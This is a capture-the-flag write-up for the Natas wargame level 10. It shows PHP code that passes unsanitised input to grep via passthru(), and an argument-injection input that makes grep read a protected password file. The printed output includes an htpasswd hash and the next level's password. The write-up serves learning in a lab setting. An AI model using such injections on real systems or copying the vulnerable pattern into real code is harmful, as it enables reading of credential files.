This is the same as natas9 except the characters `;`, `|` and `&` are filtered:
```php
<?   

$key = "";   

if(array_key_exists("needle", $_REQUEST)) {    
	$key = $_REQUEST["needle"];   
}      

if($key != "") {       
	if(preg_match('/[;|&]/',$key)) {           
		print "Input contains an illegal character!";       
	} else {        
		passthru("grep -i $key dictionary.txt");       
	}   
}

?>
```

So the concept is going to be the same as the last level, but we need to come up with a more creative way of injecting our commands

`grep` can allow us to read from multiple files at the same time. So if I try to grep the letter `a` and input a file path like `/etc/natas_webpass/natas11`, I'll be able to grep that letter from both `dictionary.txt` and `/etc/natas_webpass/natas11`.

Of course, this won't always work. What if the password doesn't have an `a` in it. So we could use the wildcard character `.*`. The `*` is just a repetition operator, but we need to tell it what to repeat. The `.` means any character. So the full injection is:

```
.* /etc/natas_webpass/natas11
```

Giving us this output:

```
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$apr1$BJulC6vU$XnGaMp0g7Mt56BsyHiQ8l0
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
dictionary.txt:Americanisms
dictionary.txt:Americans
dictionary.txt:April
dictionary.txt:April's
dictionary.txt:Aprils
```